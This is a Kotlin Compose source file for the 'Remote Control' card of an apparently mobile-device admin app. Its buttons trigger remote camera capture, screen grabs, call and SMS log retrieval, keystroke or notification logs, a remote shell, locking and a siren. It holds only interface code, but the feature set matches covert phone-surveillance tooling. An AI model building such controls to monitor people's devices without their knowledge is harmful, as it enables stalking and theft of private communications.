package com.sentinel.admin.ui.detail

import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ListAlt
import androidx.compose.material.icons.filled.Android
import androidx.compose.material.icons.filled.Call
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.Description
import androidx.compose.material.icons.filled.FlashOn
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.PhoneAndroid
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.clip
import androidx.compose.ui.semantics.Role
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

@Composable
fun AirCommandCard(
    isOnline: Boolean,
    onSystemInfoClick: () -> Unit,
    onTriggerBeaconClick: () -> Unit,
    onCapturePhotoClick: (useFront: Boolean) -> Unit,
    onFetchLogsClick: () -> Unit,
    onFetchNotifLogsClick: () -> Unit,
    onExecuteShellClick: () -> Unit,
    onCaptureScreenshotClick: () -> Unit = {},
    onLockDeviceClick: () -> Unit = {},
    onArmGeofenceClick: () -> Unit = {},
    onFetchCallLogsClick: () -> Unit = {},
    onFetchInstalledAppsClick: () -> Unit = {},
    modifier: Modifier = Modifier
) {
    Card(
        modifier = modifier.fillMaxWidth(),
        shape = RoundedCornerShape(24.dp),
        colors = CardDefaults.cardColors(
            containerColor = Color(0xFF121923)
        ),
        border = BorderStroke(1.dp, Color(0xFF34465C)),
        elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            // Header Row
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(
                    imageVector = Icons.Default.FlashOn,
                    contentDescription = null,
                    tint = Color(0xFFAAC7E8),
                    modifier = Modifier.size(20.dp)
                )
                Spacer(modifier = Modifier.width(10.dp))
                Column {
                    Text(
                        text = "REMOTE CONTROL",
                        style = MaterialTheme.typography.labelSmall,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFFD2DCE7),
                        letterSpacing = 0.8.sp
                    )
                    Text(
                        text = if (isOnline) "Direct Uplink Active" else "Host Offline · Commands Queued",
                        fontSize = 11.sp,
                        color = if (isOnline) Color(0xFF10B981) else Color(0xFF7D8997),
                        fontWeight = FontWeight.SemiBold
                    )
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            // Section 1: Surveillance & Recon
            Text(
                text = "SURVEILLANCE & RECON",
                fontSize = 10.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFF7D8997),
                letterSpacing = 0.5.sp
            )
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                TacticalCommandButton(
                    icon = Icons.Default.CameraAlt,
                    label = "Rear Cam",
                    onClick = { onCapturePhotoClick(false) },
                    enabled = isOnline,
                    accentColor = Color(0xFFAAC7E8),
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.Person,
                    label = "Front Cam",
                    onClick = { onCapturePhotoClick(true) },
                    enabled = isOnline,
                    accentColor = Color(0xFFAAC7E8),
                    modifier = Modifier.weight(1f)
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                TacticalCommandButton(
                    icon = Icons.Default.PhoneAndroid,
                    label = "Screen Grab",
                    onClick = onCaptureScreenshotClick,
                    enabled = isOnline,
                    accentColor = Color(0xFF8FB2D8),
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.Info,
                    label = "Sys Info",
                    onClick = onSystemInfoClick,
                    enabled = isOnline,
                    accentColor = Color(0xFF8FB2D8),
                    modifier = Modifier.weight(1f)
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                TacticalCommandButton(
                    icon = Icons.Default.Call,
                    label = "Call Logs",
                    onClick = onFetchCallLogsClick,
                    enabled = isOnline,
                    accentColor = Color(0xFF38BDF8),
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.Android,
                    label = "App List",
                    onClick = onFetchInstalledAppsClick,
                    enabled = isOnline,
                    accentColor = Color(0xFFA78BFA),
                    modifier = Modifier.weight(1f)
                )
            }

            Spacer(modifier = Modifier.height(14.dp))

            // Section 2: Security & Lockdown
            Text(
                text = "LOCKDOWN & DETERRENCE",
                fontSize = 10.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFF7D8997),
                letterSpacing = 0.5.sp
            )
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                TacticalCommandButton(
                    icon = Icons.Default.Lock,
                    label = "Lock Screen",
                    onClick = onLockDeviceClick,
                    enabled = isOnline,
                    isDestructive = true,
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.FlashOn,
                    label = "Siren Beacon",
                    onClick = onTriggerBeaconClick,
                    enabled = isOnline,
                    isDestructive = true,
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.LocationOn,
                    label = "Geofence 100m",
                    onClick = onArmGeofenceClick,
                    enabled = isOnline,
                    accentColor = Color(0xFF10B981),
                    modifier = Modifier.weight(1f)
                )
            }

            Spacer(modifier = Modifier.height(14.dp))

            // Section 3: Telemetry & Logs
            Text(
                text = "TELEMETRY & TERMINAL",
                fontSize = 10.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFF7D8997),
                letterSpacing = 0.5.sp
            )
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                TacticalCommandButton(
                    icon = Icons.AutoMirrored.Filled.ListAlt,
                    label = "Key & Notifs",
                    onClick = onFetchNotifLogsClick,
                    enabled = isOnline,
                    accentColor = Color(0xFFF59E0B),
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.Description,
                    label = "SMS Logs",
                    onClick = onFetchLogsClick,
                    enabled = isOnline,
                    accentColor = Color(0xFFF59E0B),
                    modifier = Modifier.weight(1f)
                )
                TacticalCommandButton(
                    icon = Icons.Default.Terminal,
                    label = "Shell",
                    onClick = onExecuteShellClick,
                    enabled = isOnline,
                    accentColor = Color(0xFFAAC7E8),
                    modifier = Modifier.weight(1f)
                )
            }
        }
    }
}

@Composable
private fun TacticalCommandButton(
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    label: String,
    onClick: () -> Unit,
    enabled: Boolean,
    modifier: Modifier = Modifier,
    accentColor: Color = Color(0xFFAAC7E8),
    isDestructive: Boolean = false
) {
    val activeColor = if (isDestructive) Color(0xFFF43F5E) else accentColor
    val borderColor = if (enabled) activeColor.copy(alpha = 0.42f) else Color(0xFF293542)
    val bgColor = if (enabled) Color(0xFF19232E) else Color(0xFF0B0F14)
    val contentAlpha = if (enabled) 1f else 0.4f

    Box(
        modifier = modifier
            .clip(RoundedCornerShape(12.dp))
            .background(bgColor)
            .border(BorderStroke(1.dp, borderColor), RoundedCornerShape(12.dp))
            .clickable(enabled = enabled, role = Role.Button, onClick = onClick)
            .padding(horizontal = 10.dp, vertical = 8.dp)
            .alpha(contentAlpha)
    ) {
        Row(
            verticalAlignment = Alignment.CenterVertically,
            modifier = Modifier.fillMaxWidth()
        ) {
            Box(modifier = Modifier.size(20.dp), contentAlignment = Alignment.Center) {
                Icon(
                    imageVector = icon,
                    contentDescription = null,
                    tint = if (enabled) activeColor else Color(0xFF7D8997),
                    modifier = Modifier.size(18.dp)
                )
            }
            Spacer(modifier = Modifier.width(8.dp))
            Text(
                text = label,
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold,
                color = if (enabled) Color(0xFFF0F2F4) else Color(0xFF7D8997),
                maxLines = 1
            )
        }
    }
}
